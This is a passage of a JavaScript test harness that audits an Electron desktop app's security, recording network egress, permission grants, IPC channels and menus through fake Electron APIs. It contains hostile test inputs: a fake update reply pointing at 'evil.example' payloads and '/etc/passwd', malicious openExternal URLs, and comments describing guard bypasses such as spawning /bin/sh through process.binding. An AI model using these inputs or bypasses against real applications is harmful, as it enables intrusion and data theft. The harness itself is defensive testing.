      // it, so the list must be the one Module._load actually built.
      preloadRequires: [...new Set(preloadRequires)],
      preloadGlobalReads,
      drained: true });
  }, 60);
}

// ── shared fakes for the main-process modes ─────────────────────────────────
const openedUrls = [];
// networkCalls is declared at the top of this file — the preload needs it too.
const requiredModules = [];
const onHandlers = {};
const permissionRequestHandlers = [];
const permissionCheckHandlers = [];
const devicePermissionHandlers = [];
let capturedWindowOpenHandler = null;
const willNavigateHandlers = [];
// `will-frame-navigate` is a SEPARATE Electron event from `will-navigate`:
// it fires for subframes and, since Electron 22, for the main frame too. A
// fake that records only `will-navigate` cannot tell a correct frame handler
// from a missing one, so its verdict on that door is worth nothing.
const willFrameNavigateHandlers = [];
const lifecycleThrows = [];
const dialogsShown = [];
const injectedScripts = [];
const injectedCss = [];
const loadedUrls = [];
const windowEvents = {};
const windowBackgroundColors = [];
const menuTemplates = [];
const menusInstalled = [];
let mainWindowInstance = null;
let mainContents = null;

function totalStub(name) {
  return new Proxy(function () {}, {
    get(target, prop) {
      if (prop === 'then' || prop === Symbol.toPrimitive || typeof prop === 'symbol') return undefined;
      if (prop === '__stubName') return name;
      return totalStub(`${name}.${String(prop)}`);
    },
    apply() { return totalStub(`${name}()`); },
    construct() { return totalStub(`new ${name}`); },
    has() { return true; },
  });
}

// Every session API that can GRANT a capability. Each is a separate door:
// `display-capture` in the permission handler does not gate getDisplayMedia
// once setDisplayMediaRequestHandler is installed, and the device/USB/Bluetooth
// pickers ask on their own channels. Handlers land here by name so the test can
// assert on doors the product does not use today but might tomorrow.
const CAPABILITY_HANDLERS = ['setPermissionRequestHandler', 'setPermissionCheckHandler',
  'setDevicePermissionHandler', 'setDisplayMediaRequestHandler', 'setBluetoothPairingHandler',
  'setUSBProtectedClassesHandler', 'setCertificateVerifyProc', 'setProxy', 'allowNTLMCredentialsForDomains'];
const installedHandlers = {};
// The product feature-detects (`typeof ses.X === 'function'`) before installing
// several of these. A fake that LACKS a method therefore makes the product
// silently skip it — the guard reads clean while the door was never measured.
// So the fake carries every capability API by name, and records what it was
// handed. `sessionReads` additionally records every property the product
// TOUCHES, so a future feature-detect for something absent here is visible
// rather than silent.
const sessionReads = new Set();
const fakeSessionTarget = {
  webRequest: { onBeforeRequest() {}, onHeadersReceived() {} },
  setSpellCheckerEnabled() {},
};
for (const name of CAPABILITY_HANDLERS) {
  fakeSessionTarget[name] = (...args) => { (installedHandlers[name] ||= []).push(args[0]); };
}
fakeSessionTarget.setPermissionRequestHandler = (fn) => {
  installedHandlers.setPermissionRequestHandler = [fn]; permissionRequestHandlers.push(fn);
};
fakeSessionTarget.setPermissionCheckHandler = (fn) => {
  installedHandlers.setPermissionCheckHandler = [fn]; permissionCheckHandlers.push(fn);
};
fakeSessionTarget.setDevicePermissionHandler = (fn) => {
  installedHandlers.setDevicePermissionHandler = [fn]; devicePermissionHandlers.push(fn);
};
const fakeSession = new Proxy(fakeSessionTarget, {
  get(target, prop) {
    if (typeof prop === 'string') sessionReads.add(prop);
    return target[prop];
  },
});

class FakeWebContents {
  constructor() {
    this.session = fakeSession;
    this._on = {};
  }
  on(event, cb) {
    (this._on[event] ||= []).push(cb);
    if (event === 'will-navigate') willNavigateHandlers.push(cb);
    if (event === 'will-frame-navigate') willFrameNavigateHandlers.push(cb);
  }
  setWindowOpenHandler(fn) { capturedWindowOpenHandler = fn; }
  openDevTools() {}
  closeDevTools() {}
  isDevToolsOpened() { return false; }
  send() {}
  getURL() { return 'http://127.0.0.1:14322/'; }
  setZoomFactor() {}
  setZoomLevel() {}
  setVisualZoomLevelLimits() {}
  insertCSS(css) { injectedCss.push(String(css)); return Promise.resolve(''); }
  // executeJavaScript runs arbitrary code IN THE RENDERER, from the main
  // process, outside every policy above — the permission handlers, the
  // navigation gate and the contextBridge all sit to one side of it. Record
  // every script so the test can pin what the app is allowed to inject.
  executeJavaScript(code) { injectedScripts.push(String(code)); return Promise.resolve(undefined); }
  reload() {}
  removeAllListeners() {}
  once(event, cb) { return this.on(event, cb); }
  setUserAgent() {}
  getUserAgent() { return 'fake'; }
}

// The options every BrowserWindow is actually constructed with. `sandbox`,
// `contextIsolation` and `nodeIntegration` ARE the renderer's security model:
// with contextIsolation off, the preload's own globals are the page's globals
// and every bridge guarantee above is void — while all of those checks still
// pass, because they measure the preload, not the window it is loaded into.
const windowOptions = [];

class FakeBrowserWindow {
  constructor(opts) {
    windowOptions.push(opts && opts.webPreferences ? { ...opts.webPreferences } : null);
    this.webContents = new FakeWebContents(); mainContents = this.webContents;
    mainWindowInstance = this;
  }
  loadURL(url) { loadedUrls.push(String(url)); }
  on(event, cb) { (windowEvents[event] ||= []).push(cb); }
  once(event, cb) { return this.on(event, cb); }
  show() {}
  isMinimized() { return false; }
  restore() {}
  focus() {}
  setBackgroundColor(color) { windowBackgroundColors.push(color); }
  // Returning null here meant the ipcMain handler's `if (win)` was always
  // false, so every payload driven through it reached nothing and the whole
  // IPC probe measured an early return. Resolve the sender to its window the
  // way Electron does.
  static fromWebContents(contents) {
    return contents && contents === mainContents ? mainWindowInstance : null;
  }
  static getAllWindows() { return mainWindowInstance ? [mainWindowInstance] : []; }
}

// Chromium reads its command line during startup, so these switches ARE the
// browser's configuration — one of them is the only thing keeping the renderer
// off Google's networks, and a `remote-debugging-port` added here would open
// the whole renderer to any local process. Record every one.
const commandLineSwitches = [];
let singleInstanceLockRequested = false;

const fakeApp = {
  isReady: () => true,
  on(event, cb) { (onHandlers[event] ||= []).push(cb); },
  quit() {}, exit() {},
  requestSingleInstanceLock: () => { singleInstanceLockRequested = true; return true; },
  whenReady: () => Promise.resolve(),
  getPath: () => '/tmp',
  getVersion: () => '0.0.224',
  setName() {},
  commandLine: {
    appendSwitch(name, value) {
      commandLineSwitches.push(value === undefined ? String(name) : `${name}=${value}`);
    },
    appendArgument(arg) { commandLineSwitches.push(`arg:${String(arg)}`); },
    hasSwitch: () => false,
    getSwitchValue: () => '',
  },
};

// shell.openExternal is recorded on the FUNCTION, so destructuring it
// (`const { openExternal } = shell`) or aliasing it still records every call.
const recordingOpenExternal = (u) => { openedUrls.push(String(u)); return Promise.resolve(); };
const fakeShell = {
  openExternal: recordingOpenExternal,
  openPath: (p) => { openedUrls.push(`openPath:${String(p)}`); return Promise.resolve(''); },
  showItemInFolder: (p) => { openedUrls.push(`showItemInFolder:${String(p)}`); },
  trashItem: () => Promise.resolve(),
  beep() {},
};

// Every main-process IPC channel the app listens on IS its attack surface from
// the renderer: whatever is registered here can be reached by any script the
// page runs, through the preload or otherwise. Record the names and the
// registering API (`handle` is invoke/two-way, `on` is send/one-way).
const ipcChannels = [];
const fakeIpcMain = {
  on(channel, fn) { ipcChannels.push(['on', String(channel)]); (fakeIpcMain._h[channel] ||= []).push(fn); },
  once(channel, fn) { ipcChannels.push(['once', String(channel)]); (fakeIpcMain._h[channel] ||= []).push(fn); },
  handle(channel, fn) { ipcChannels.push(['handle', String(channel)]); (fakeIpcMain._h[channel] ||= []).push(fn); },
  handleOnce(channel, fn) { ipcChannels.push(['handleOnce', String(channel)]); (fakeIpcMain._h[channel] ||= []).push(fn); },
  removeHandler() {}, removeAllListeners() {},
  _h: {},
};

const fakeElectron = {
  app: fakeApp,
  BrowserWindow: FakeBrowserWindow,
  ipcMain: fakeIpcMain,
  // response 0 = the FIRST button, i.e. the user accepting. Answering "yes" is
  // what drives the update flow's download branch; a fake that declined would
  // leave the only code path that reaches the OS untested.
  dialog: {
    showMessageBox: (...a) => {
      dialogsShown.push(JSON.stringify((a[1] && a[1].message) || (a[0] && a[0].message) || ''));
      return Promise.resolve({ response: 0 });
    },
    showErrorBox() {},
  },
  shell: fakeShell,
  session: { defaultSession: fakeSession, fromPartition: () => fakeSession },
  nativeTheme: { shouldUseDarkColors: false, on() {} },
  // The MENU is a capability surface: Electron installs a DEFAULT application
  // menu when none is set, and its View submenu carries live `toggleDevTools`,
  // `reload` and `forceReload` roles — a shipped inspector on the production
  // renderer (RED-DESKTOP-21/001). Record the template built AND what was
  // finally installed, so "no menu set at all" is distinguishable from "a
  // correct menu set".
  Menu: {
    setApplicationMenu(menu) { menusInstalled.push(menu === null ? null : (menu && menu.__template) || 'unknown'); },
    buildFromTemplate: (template) => {
      menuTemplates.push(template);
      return { __template: template };
    },
  },
  autoUpdater: totalStub('autoUpdater'),
  net: {
    request: (...a) => { networkCalls.push(['net.request', String(a[0]?.url ?? a[0])]); return totalStub('net.request()'); },
    connect: (...a) => { networkCalls.push(['net.connect', JSON.stringify(a[0])]); return totalStub('net.connect()'); },
  },
};

// Instrument the REAL builtins, in place, rather than substituting fakes in
// Module._load. Substitution only covers `require()`: ESM `import()` and
// `process.getBuiltinModule()` both bypass that hook and hand back the real
// module (verified), so a fake-module egress guard has two doors standing open.
// Node caches ONE object per builtin, so wrapping the outbound entry points on
// that object instruments every door at once — require, import, getBuiltinModule,
// createRequire, and the copy express already holds.
//
// Only OUTBOUND calls are wrapped. createServer/listen are untouched, so the
// real backend bundle still boots and serves; what it may not do is dial out.
const instrumented = [];
const loopbackCalls = [];
// Binding and dialling 127.0.0.1 is how this app talks to its OWN backend; it
// is not egress. The list is exact literals only — no suffix matching, so
// `127.0.0.1.evil.com` and `localhost.evil.com` are egress, as they should be.
const LOOPBACK = new Set(['127.0.0.1', '::1', 'localhost', '0.0.0.0', '::', '']);
const isLoopback = (host) => host === undefined || host === null || LOOPBACK.has(String(host));
function instrumentOutbound() {
  // `passLoopback` names the argument index carrying the host: a call to
  // loopback runs for real and is recorded separately; everything else is
  // recorded as egress and refused.
  const wrap = (obj, prop, label, describe, passLoopback = null) => {
    const original = obj && obj[prop];
    if (typeof original !== 'function') return;
    const replacement = function (...args) {
      if (passLoopback !== null && isLoopback(passLoopback(args))) {
        loopbackCalls.push([label, describe(args)]);
        return original.apply(this, args);
      }
      networkCalls.push([label, describe(args)]);
      throw new Error(`${label} refused by the egress probe (recorded)`);
    };
    try { obj[prop] = replacement; instrumented.push(label); } catch { /* frozen */ }
  };
  const first = (a) => {
    const v = a[0];
    if (typeof v === 'string') return v;
    try { return JSON.stringify(v); } catch { return String(v); }
  };
  // net.Socket.connect(port, host) / connect({host}) / connect(path)
  const socketHost = (a) => (typeof a[0] === 'object' && a[0] !== null
    ? a[0].host : (typeof a[1] === 'string' ? a[1] : undefined));
  // http.request(url | {host|hostname} | url, options)
  const urlHost = (a) => {
    const v = a[0];
    if (typeof v === 'string') { try { return new URL(v).hostname; } catch { return v; } }
    if (v instanceof URL) return v.hostname;
    if (v && typeof v === 'object') return v.hostname ?? v.host;
    return undefined;
  };
  const net = require('node:net');
  const tls = require('node:tls');
  const http = require('node:http');
  const https = require('node:https');
  const http2 = require('node:http2');
  const dgram = require('node:dgram');
  const dns = require('node:dns');
  const cp = require('node:child_process');
  // The prototype is the floor every higher-level client falls through:
  // http.request, undici/fetch and any hand-rolled socket all reach it.
  wrap(net.Socket.prototype, 'connect', 'net.Socket.connect', first, socketHost);
  for (const p of ['connect', 'createConnection']) wrap(net, p, `net.${p}`, first, socketHost);
  wrap(tls, 'connect', 'tls.connect', first, socketHost);
  for (const p of ['get', 'request']) {
    wrap(http, p, `http.${p}`, first, urlHost);
    wrap(https, p, `https.${p}`, first, urlHost);
  }
  wrap(http2, 'connect', 'http2.connect', first, urlHost);
  wrap(dgram, 'createSocket', 'dgram.createSocket', first);
  // dns.lookup is also how `server.listen(port, '127.0.0.1')` resolves its OWN
  // bind address — refusing it kills the app's inbound listener, which is not
  // egress at all. Loopback names pass through; anything else is recorded.
  for (const p of ['lookup', 'resolve', 'resolve4', 'resolve6']) wrap(dns, p, `dns.${p}`, first, (a) => a[0]);
  if (dns.promises) {
    for (const p of ['lookup', 'resolve']) wrap(dns.promises, p, `dns.promises.${p}`, first, (a) => a[0]);
  }
  for (const p of ['exec', 'execSync', 'execFile', 'execFileSync', 'spawn', 'spawnSync', 'fork']) {
    wrap(cp, p, `child_process.${p}`, first);
  }
}
instrumentOutbound();

// fetch is a global, not a module: wrap it before the app loads.
//
// The update server's JSON is UNTRUSTED INPUT — whoever answers
// /api/version (the real host, a proxy, a captive portal, DNS) chooses every
// field in it. A reply of exactly `{version}` tests only the happy path, so the
// body is hostile: every plausible field an app might follow carries an
// attacker URL. Anything the app then dials or opens is recorded by the same
// networkCalls / openedUrls the assertions already read, so a mutant that
// trusts `data.downloadUrl` fails without needing its own assertion.
const HOSTILE_UPDATE_JSON = {
  version: '9.9.9',
  downloadUrl: 'https://evil.example/payload.dmg',
  url: 'https://evil.example/payload.dmg',
  dmg: 'file:///Applications/Calculator.app',
  manifestUrl: 'https://evil.example/manifest.json',
  notesUrl: 'javascript:alert(1)',
  releaseNotes: 'https://evil.example/notes',
  updateUrl: 'https://evil.example/u',
  path: '/etc/passwd',
};
// UPDATE_REPLY lets a run choose what the update server answers, so the same
// runner can measure the happy path AND the shapes a hostile or broken server
// sends. Selected by env so each is a separate child process with a clean app.
const UPDATE_REPLIES = {
  // The default: a newer version, plus every attacker-controlled field.
  hostile: { status: 200, ok: true, body: HOSTILE_UPDATE_JSON },
  // A NON-OK response. The app must not act on an error body — a captive
  // portal answers 200 with HTML, and a 500 page can still parse as JSON.
  notok: { status: 503, ok: false, body: { ...HOSTILE_UPDATE_JSON, version: '9.9.9' } },
  // A version that is not a version. `parseInt` used to read '999junk.0.0' as
  // 999.0.0 and prompt every installed copy; these must all compare as "no
  // update", so NO dialog may be shown and nothing may reach the OS.
  junkversion: { status: 200, ok: true, body: { version: '999junk.0.0' } },
};
const updateReply = UPDATE_REPLIES[process.env.UPDATE_REPLY || 'hostile'] || UPDATE_REPLIES.hostile;
globalThis.fetch = (url, init) => {
  networkCalls.push(['fetch', String(url)]);
  return Promise.resolve({
    ok: updateReply.ok,
    status: updateReply.status,
    json: async () => ({ ...updateReply.body }),
    text: async () => JSON.stringify(updateReply.body),
  });
};
globalThis.WebSocket = function (url) { networkCalls.push(['WebSocket', String(url)]); return totalStub('ws'); };
globalThis.XMLHttpRequest = function () { networkCalls.push(['XMLHttpRequest', '']); return totalStub('xhr'); };

// ESM `import()` does NOT go through Module._load — verified: the dynamic
// import resolves the REAL module and this hook never sees the request. So a
// runtime-only egress guard has a hole an `await import("node:tls")` walks
// straight through. Record the static import surface as well; the test treats
// both as the module list, and a network module appearing either way fails.
const dynamicImports = [];
{
  const src = require('fs').readFileSync(path.resolve(mainCjs), 'utf8')
    .replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/[^\n]*/g, '$1');
  for (const m of src.matchAll(/\bimport\s*\(\s*['"`]([^'"`]+)['"`]/g)) dynamicImports.push(m[1]);
  for (const m of src.matchAll(/\bfrom\s+['"]([^'"]+)['"]/g)) dynamicImports.push(m[1]);
  // A non-literal specifier cannot be resolved statically; name it so the test
  // fails loudly rather than silently accepting an unknown import.
  for (const m of src.matchAll(/\bimport\s*\(\s*(?!['"`])([^)]{0,40})/g)) {
    dynamicImports.push(`<computed:${m[1].trim().slice(0, 30)}>`);
  }
}

// F2: the packaged app's backend is `dist/server.cjs`, required in-process by
// electron-main. Stubbing it to `{}` deleted the whole server from the egress
// measurement — the half of the desktop process that actually talks to the
// network, and the only half with an LLM client in it. Load the real bundle.
// Its outbound calls go through the instrumented builtins above like everyone
// else's; its inbound listen is left alone so it still boots.
let backendLoaded = false;
function loadBackend() {
  const bundle = path.join(repoRoot, 'dist', 'server.cjs');
  if (!require('fs').existsSync(bundle)) {
    out({ error: `dist/server.cjs is missing (${bundle}). The backend is half the desktop `
      + "process's egress surface; measuring without it proves nothing. Run `npm run build` first." });
  }
  // The packaged condition (CLAUDE.md): an empty cwd, so dotenv finds no .env
  // and cannot hand the app credentials a shipped build never has. A backend
  // holding this repo's real API keys would dial hosts the packaged one cannot.
  const cwd = process.cwd();
  process.chdir(require('os').tmpdir());
  // electron-main sets PORT=14321, the SHIPPING port — which the real installed
  // app is usually already holding. Its EADDRINUSE retry would then walk up
  // into ports this run does not own. Use a dedicated one and a private
  // userData dir so this probe can never collide with a live desktop app.
  process.env.PORT = String(EGRESS_PORT);
  const egressUserData = require('fs')
    .mkdtempSync(path.join(require('os').tmpdir(), 'nash-egress-probe-'));
  process.env.ELECTRON_USER_DATA_PATH = egressUserData;
  // The backend holds this directory for the life of the process, so it can
  // only be removed on exit — but it MUST be: without this the runner left one
  // behind on every invocation, and 969 `nash-egress-probe-*` directories had
  // accumulated in this machine's temp dir by the time they were counted.
  process.once('exit', () => {
    try { require('fs').rmSync(egressUserData, { recursive: true, force: true }); }
    catch { /* best effort at exit */ }
  });
  try {
    backendLoaded = true;
    return originalLoad.call(Module, bundle, module, false);
  } finally { process.chdir(cwd); }
}

// SR-55. Attribution by `parent.filename` alone asks WHOSE require object was
// used, and electron-main can borrow another one: `require.main.require('dns')`
// resolves through the RUNNER's module, so parent.filename is the runner and
// the census recorded nothing. Measured: a worker spawned that way ran
// `dns.lookup` in a separate thread — where none of the in-process patches
// exist — and wrote its proof file with all 452 checks green. Attribute by the
// CALL STACK too: whoever borrowed the require object, the frame that asked for
// it is still in electron-main.cjs. ~3.5us per load, and this file is a harness.
const MAIN_RESOLVED = path.resolve(mainCjs);
// The hook's own frame reads `at Module._load (<this file>:LINE:COL)`. Matched
// by function name + file so it cannot swallow an unrelated runner frame.
const HOOK_FRAME = `at Module._load (${__filename}`;
const SELF_FRAME = `at calledFromMain (${__filename}`;
// It must be the NEAREST frame, not merely present: electron-main requires
// dist/server.cjs synchronously, so every transitive require the BACKEND makes
// still has electron-main further down the stack. A contains-check therefore
// dragged all 39 of the backend's own modules into electron-main's census.
const calledFromMain = () => {
  const prev = Error.stackTraceLimit;
  Error.stackTraceLimit = 30;
  const stack = new Error().stack || '';
  Error.stackTraceLimit = prev;
  // Frames 0..n are the machinery between us and the caller: this hook itself,
  // node:diagnostics_channel (traceSync), and node:internal/modules/*. The
  // first frame past them is the REAL caller. Measured shapes:
  //   require('x')            -> hook, traceSync, wrapModuleLoad, <caller>
  //   require.main.require(x) -> hook, traceSync, wrapModuleLoad,
  //                              Module.require, <caller>
  // THIS FILE is skipped only as the hook frame at the top; a later frame in
  // the runner means the runner really is the caller (loadBackend's own
  // require('os') — measured, it showed up in the census as `os`).
  // MEASURED frame shapes, not guessed (the guess was wrong twice):
  //   require('x') from main   -> calledFromMain, Module._load(runner),
  //                               traceSync, wrapModuleLoad, <main>
  //   require.main.require('x')-> ..., wrapModuleLoad, Module.require,
  //                               require(helpers), <main>
  // So skip this function's own frame, the hook's, and every node: frame; the
  // first file frame after them is the caller. A `node:` frame is never the
  // answer, which is why they are skipped rather than terminating the walk —
  // require.main.require puts TWO of them between the hook and the caller.
  const frames = stack.split('\n').slice(1);
  let i = 0;
  while (i < frames.length
    && (frames[i].includes('node:') || frames[i].includes(SELF_FRAME)
      || frames[i].includes(HOOK_FRAME))) i += 1;
  const m = /\(?((?:\/|[A-Za-z]:\\)[^):]+)/.exec(frames[i] || '');
  return !!m && m[1] === MAIN_RESOLVED;
};

const originalLoad = Module._load;
Module._load = function (request, parent, isMain) {
  // Only record what electron-main itself pulls in, not transitive deps.
  if ((parent && parent.filename === MAIN_RESOLVED) || calledFromMain()) {
    requiredModules.push(request);
  }
  if (request === 'electron') return fakeElectron;
  if (/dist[/\\]server\.cjs$/.test(request)) {
    // Only the egress mode needs the backend; the others would pay its boot
    // cost for nothing. They assert `backendLoaded` is false, never true.
    return mode === 'egress' ? loadBackend() : {};
  }
  return originalLoad.call(this, request, parent, isMain);
};

// `process.getBuiltinModule('node:dns')` does NOT go through Module._load —
// verified: it returns the REAL module. That is now harmless (the real module
// is the instrumented one), but record the use: it has no legitimate purpose
// in this app and is a strong signal on its own.
const moduleDoorsInstrumented = [];
if (typeof process.getBuiltinModule === 'function') {
  const original = process.getBuiltinModule.bind(process);
  process.getBuiltinModule = (request) => {
    requiredModules.push(`getBuiltinModule:${request}`);
    return original(request);
  };
  moduleDoorsInstrumented.push('getBuiltinModule');
}

// SR-52. getBuiltinModule was ONE door of a family and closing it alone left
// the others open. `process.binding('spawn_sync').spawn({file:'/bin/sh',…})`
// ran /bin/sh from inside the main process — MEASURED, it wrote its proof file
// — with all 440 checks green: no require, no getBuiltinModule, no fetch.
// `tcp_wrap` hands back a live TCP/TCPConnectWrap pair the same way. Record
// every internal-binding door; the exact-module-list assertion then kills them.
for (const door of ['binding', '_linkedBinding']) {
  if (typeof process[door] !== 'function') continue;
  const original = process[door].bind(process);
  process[door] = (request) => {
    requiredModules.push(`${door}:${request}`);
    return original(request);
  };
  moduleDoorsInstrumented.push(door);
}

// A fixed observation window can always be outwaited: `setTimeout(() =>
// fetch('https://telemetry.evil.example/late'), 9000)` produced no finding at
// 4200ms, and raising the number only moves the goalpost — a beacon at
// startup+60s would still be silent, and it is no less egress for being late.
//
// So census the timers the app SCHEDULES as well. A recorded call answers "what
// did it dial?"; what is still armed when the window closes answers "what is it
// still going to do?", which no wait can reach. Installed BEFORE the require:
// patched afterwards it would miss every timer the app arms while loading, and
// createWindow's update-check timer among them.
require(path.resolve(mainCjs));

// A lifecycle handler that throws under the fake has NOT run to completion, so
// whatever it was going to install is missing and every "nothing found" verdict
// downstream is the harness measuring an app that never finished booting. Record
// it; the modes below refuse to report a clean result while any throw stands.
const fire = (event, ...args) => {
  for (const cb of onHandlers[event] || []) {
    try { cb(...args); } catch (e) { lifecycleThrows.push(`${event}: ${e && e.message}`); }
  }
};
const assertBooted = () => {
  if (lifecycleThrows.length) {
    out({ error: `app lifecycle handler(s) threw under the fake: ${lifecycleThrows.join('; ')}. `
      + 'The app did not finish booting, so this run measured nothing.' });
  }
};

fire('ready');
// The policy is installed by hardenWebContents(), which runs inside
// createWindow() — so the window must actually be created, by the same door
// the shipping app uses: server.ts calls global.onExpressListening(port) once
// Express binds. Without this the handlers are never installed and every
// "granted: []" below would be the harness measuring nothing.
if (typeof globalThis.onExpressListening === 'function') {
  // A throw here means the fake is missing a method the real code calls. That
  // MUST be loud: a half-created window installs no handlers, and every
  // "granted: []" would then be the harness measuring nothing.
  try { globalThis.onExpressListening(14322); } catch (e) {
    out({ error: `createWindow threw under the fake: ${e.message}. The fake electron surface is `
      + 'incomplete, so this run measured nothing.' });
  }
} else {
  out({ error: 'global.onExpressListening was never defined — the app never reached its '
    + 'window-creation door, so nothing below measures the real policy.' });
}

// The permissions mode used to run SYNCHRONOUSLY after the app loaded, so
// anything the app did on a later tick was invisible to it — the same defect
// the bridge mode had. Both of these survived until this wait was added:
//   setTimeout(() => ses.setPermissionRequestHandler((_w, p, cb) => cb(true)), 5)
//     a SECOND handler granting everything; the last one installed wins, so the
//     allowlist measured here was simply replaced afterwards.
//   setTimeout(() => Menu.setApplicationMenu(null), 5)
//     the audited menu replaced by Electron's DEFAULT one, which carries live
//     toggleDevTools / reload / forceReload roles.
// `deferredMs` is reported so the test asserts the wait happened.
const DEFERRED_MS = 120;
if (mode === 'permissions') setTimeout(runPermissionsMode, DEFERRED_MS);
function runPermissionsMode() {
  // Every permission name in the installed Electron's own handler unions, plus
  // a name that does not exist. SR-53: this list carried the invented
  // 'background-sync' and 'unknown-permission' but NOT Electron's real
  // 'unknown' — the one name Electron actually sends for a permission it does
  // not recognise, and the one a careless allowlist is most likely to contain.
  // The test asserts this list against electron.d.ts, so it cannot drift.
  const ALL = ['clipboard-read', 'clipboard-sanitized-write', 'display-capture', 'fullscreen',
    'geolocation', 'hid', 'idle-detection', 'keyboardLock', 'media', 'mediaKeySystem',
    'midi', 'midiSysex', 'notifications', 'openExternal', 'pointerLock', 'serial',
    'speaker-selection', 'storage-access', 'top-level-storage-access', 'usb',
    'window-management', 'fileSystem', 'unknown', 'not-a-real-permission'];
  const granted = [];
  const checked = [];
  const reqHandler = permissionRequestHandlers[permissionRequestHandlers.length - 1];
  const chkHandler = permissionCheckHandlers[permissionCheckHandlers.length - 1];
  for (const p of ALL) {
    if (typeof reqHandler === 'function') {
      reqHandler({}, p, (allow) => { if (allow) granted.push(p); });
    }
    if (typeof chkHandler === 'function') {
      try { if (chkHandler({}, p)) checked.push(p); } catch { /* ignore */ }
    }
  }
  let deviceGranted = null;
  if (devicePermissionHandlers.length) {
    try { deviceGranted = devicePermissionHandlers[0]({ deviceType: 'hid', device: {} }); } catch { deviceGranted = 'threw'; }
  }
  // getDisplayMedia does NOT go through the permission handler once a display
  // media handler is installed — it is a separate grant channel. If the app
  // ever installs one, whatever it hands back IS the screen-capture policy.
  // A webview, a popup or a devtools child arrives LATER, through
  // `web-contents-created`, and carries its own session. If that path does not
  // harden, the policy above covers only the first window — and every count in
  // this section still reads correct, because it measures that first window.
  // Drive the event with a fresh contents on a FRESH session and see whether
  // the policy lands on it too.
  // A genuinely FRESH session. Spreading the existing one copied its
  // `__nashPermissionPolicy: true` marker, so the product correctly skipped it
  // and the probe read "not hardened" for a product that was right — the probe
  // had smuggled in the already-policed flag.
  const lateSession = {};
  for (const name of CAPABILITY_HANDLERS) lateSession[name] = () => {};
  lateSession.webRequest = { onBeforeRequest() {}, onHeadersReceived() {} };
  lateSession.setSpellCheckerEnabled = () => {};
  const lateHandlers = { request: null, check: null, device: null };
  lateSession.setPermissionRequestHandler = (fn) => { lateHandlers.request = fn; };
  lateSession.setPermissionCheckHandler = (fn) => { lateHandlers.check = fn; };
  lateSession.setDevicePermissionHandler = (fn) => { lateHandlers.device = fn; };
  // A brand-new webContents has NOT navigated yet: getURL() is ''. Inheriting
  // the main window's URL here made the probe describe a contents that does not
  // exist, and a gate conditioned on "has a URL already" would pass for free.
  const lateContents = new FakeWebContents();
  lateContents.session = lateSession;
  lateContents.getURL = () => '';
  fire('web-contents-created', { preventDefault() {} }, lateContents);
  const lateGranted = [];
  for (const p of ALL) {
    if (typeof lateHandlers.request === 'function') {
      lateHandlers.request({}, p, (allow) => { if (allow) lateGranted.push(p); });
    }
  }

  let displayMediaGrant = null;
  for (const fn of installedHandlers.setDisplayMediaRequestHandler || []) {
    if (typeof fn !== 'function') continue;
    try {
      fn({ frame: null, securityOrigin: 'http://127.0.0.1:14322', videoRequested: true,
        audioRequested: true, userGesture: false },
      (streams) => { displayMediaGrant = streams === null ? null : JSON.stringify(streams); });
    } catch { displayMediaGrant = 'threw'; }
  }
  assertBooted();
  out({
    requestHandlerInstalled: typeof reqHandler === 'function',
    checkHandlerInstalled: typeof chkHandler === 'function',
    deviceHandlerInstalled: devicePermissionHandlers.length > 0,
    granted, checked, deviceGranted, probed: ALL.length, probedNames: ALL,
    displayMediaHandlerInstalled: (installedHandlers.setDisplayMediaRequestHandler || []).length > 0,
    displayMediaGrant,
    // Every capability API the fake offers, and whether the app installed
    // anything on it. A door the app does not use must stay empty.
    handlerCensus: Object.fromEntries(CAPABILITY_HANDLERS
      .map((n) => [n, (installedHandlers[n] || []).length])),
    // Every session property the product touched. A feature-detect for
    // something the fake does not carry would show up here as a read with no
    // corresponding census entry — the silent-skip shape this probe was
    // written for.
    sessionReads: [...sessionReads].sort(),
    // A LATE webContents (webview / popup / devtools child) on its own session.
    lateHardened: typeof lateHandlers.request === 'function'
      && typeof lateHandlers.check === 'function'
      && typeof lateHandlers.device === 'function',
    lateGranted,
    lateNavigationGated: typeof lateContents._on['will-navigate'] !== 'undefined'
      && typeof lateContents._on['will-frame-navigate'] !== 'undefined',
    commandLineSwitches,
    singleInstanceLockRequested,
    deferredMs: DEFERRED_MS,
    // Every `role` anywhere in the installed menu tree, flattened. A role is a
    // live Electron capability, not a label: `toggleDevTools` opens an
    // inspector on the production renderer whatever the item is called.
    menuRoles: menusInstalled.flatMap((t) => {
      const roles = [];
      const walk = (items) => {
        for (const item of Array.isArray(items) ? items : []) {
          if (item && typeof item.role === 'string') roles.push(item.role);
          if (item && item.submenu) walk(item.submenu);
        }
      };
      walk(Array.isArray(t) ? t : []);
      return roles;
    }),
    menusInstalledCount: menusInstalled.length,
    menuSetToNull: menusInstalled.some((t) => t === null),
    menuTemplatesBuilt: menuTemplates.length,
  });
}

if (mode === 'egress') {
  // Drive the update check the way the app does, then report every call.
  // The update check is scheduled 3000ms after the first window opens, so wait
  // past it. The test asserts the fetch DID happen: a run that records nothing
  // would otherwise "prove" the app makes no calls by never letting it try.
  const done = () => {
    assertBooted();
    // pendingTimers is attached by out() for every mode — see the census at the
    // top of this file. A fixed window can be outwaited, so what is still ARMED
    // at report time is a finding too.
    out({
      networkCalls,
      requiredModules: [...new Set(requiredModules)],
      dynamicImports: [...new Set(dynamicImports)],
      openedUrls,
      backendLoaded,
      instrumented,
      // Which of the Module._load-bypassing doors this runner actually wraps.
      // Reported so the test can assert the census is watching, not merely that
      // today's census is empty.
      moduleDoorsInstrumented,
      windowOptions,
      dialogsShown,
    });
  };
  fire('browser-window-created', {}, { webContents: mainContents });

  // realSetTimeout, not the patched one: the runner's own wait must not appear
  // in the census as a timer the app armed.
  realSetTimeout(done, 4200);
}

if (mode === 'openexternal') {
  const HOSTILE = ['file:///etc/passwd', 'smb://evil/share', 'javascript:alert(1)',
    'data:text/html,<script>1</script>', 'tel:+15551234', 'vscode://evil/x',
    'http://plain.example/x', 'https://ok.example/x',
    // LOOK-ALIKES. A gate that asks whether the URL "contains 127.0.0.1" or
    // ends with the app's host, rather than comparing the parsed ORIGIN,
    // accepts every one of these — and each is a remote origin driving the
    // whole UI inside a window with no URL bar (titleBarStyle: 'hidden').
    'https://127.0.0.1.evil.example/x',
    'https://evil.example/?x=http://127.0.0.1:14322/',
    'https://evil.example/#http://127.0.0.1:14322/',
    'https://evil.example/127.0.0.1:14322',
    'http://127.0.0.1:14322@evil.example/x',
    'https://127.0.0.1:9999/x',
    // Scheme downgrade on the app's own host: same origin string to a
    // substring check, a different origin to the browser.
    'https://127.0.0.1:14322/x',
